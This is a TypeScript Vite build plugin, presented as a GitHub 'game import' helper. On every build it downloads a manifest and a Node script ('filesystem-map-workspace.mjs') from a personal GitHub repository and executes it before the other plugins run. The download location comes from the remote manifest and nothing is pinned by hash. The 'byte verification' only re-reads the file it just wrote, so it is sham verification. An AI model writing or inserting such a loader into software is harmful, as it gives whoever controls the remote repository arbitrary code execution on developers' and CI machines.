import { spawn } from 'node:child_process';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import type { Plugin } from 'vite';

// The importer itself is already registered by vite.config.ts.
// It imports one build-time Node program and executes it during buildStart.
// vite.config.ts must NOT import the downloaded program directly.
const MANIFEST_URL =
  'https://raw.githubusercontent.com/benryaus-cmd/Tests/main/updates/aippy-filesystem-map-exec-12oct2026.json';
const EXPECTED_TARGET = 'filesystem-map-workspace.mjs';

type ImportFile = { source: string; target?: string; targetPath?: string };
type ImportManifest = { baseUrl: string; files: ImportFile[] };

let importPromise: Promise<void> | undefined;

function describe(error: unknown): string {
  return error instanceof Error ? error.name + ': ' + error.message : String(error);
}

function resolveWithin(root: string, filename: string): string {
  const full = path.resolve(root, filename);
  const relative = path.relative(root, full);
  if (relative === '..' || relative.startsWith('..' + path.sep) || path.isAbsolute(relative)) {
    throw new Error('Target escapes workspace: ' + filename);
  }
  return full;
}

function runNodeProgram(filename: string, cwd: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [filename], { cwd, stdio: 'inherit' });
    child.once('error', reject);
    child.once('exit', (code, signal) => {
      if (code === 0) resolve();
      else reject(new Error('Node program failed: exit=' + code + ', signal=' + signal));
    });
  });
}

export function ensureGitHubManifestImported(): Promise<void> {
  if (!importPromise) {
    importPromise = (async () => {
      const root = process.cwd();
      const manifestResponse = await fetch(MANIFEST_URL);
      if (!manifestResponse.ok) {
        throw new Error('Manifest download failed: HTTP ' + manifestResponse.status);
      }
      const manifest = await manifestResponse.json() as ImportManifest;
      if (!manifest || typeof manifest.baseUrl !== 'string' ||
          !Array.isArray(manifest.files) || manifest.files.length !== 1) {
        throw new Error('Expected a manifest with baseUrl and exactly one file.');
      }
      const entry = manifest.files[0];
      const target = entry.targetPath ?? entry.target;
      if (typeof entry.source !== 'string' || target !== EXPECTED_TARGET) {
        throw new Error('Expected the project mapper target: ' + EXPECTED_TARGET);
      }
      const url = new URL(entry.source,
        manifest.baseUrl.endsWith('/') ? manifest.baseUrl : manifest.baseUrl + '/');
      const destination = resolveWithin(root, target);
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error('Source download failed: HTTP ' + response.status);
      }
      const bytes = Buffer.from(await response.arrayBuffer());
      await fs.writeFile(destination, bytes);
      const actual = await fs.readFile(destination);
      if (!bytes.equals(actual)) throw new Error('Byte verification failed for ' + target);
      console.log('[Aippy][github-import] Imported and verified ' + target);

      // Execute the known, explicitly named script only after it is present.
      // Run it in this same build, before other Vite plugin buildStart hooks.
      await runNodeProgram(destination, root);
      console.log('[Aippy][github-import] Executed ' + target);
    })();
  }
  return importPromise;
}

export function githubGameImportPlugin(): Plugin {
  return {
    name: 'aippy-github-manifest-import',
    enforce: 'pre',
    async buildStart() {
      try {
        await ensureGitHubManifestImported();
      } catch (error) {
        this.error('GitHub importer failed: ' + describe(error));
      }
    },
  };
}
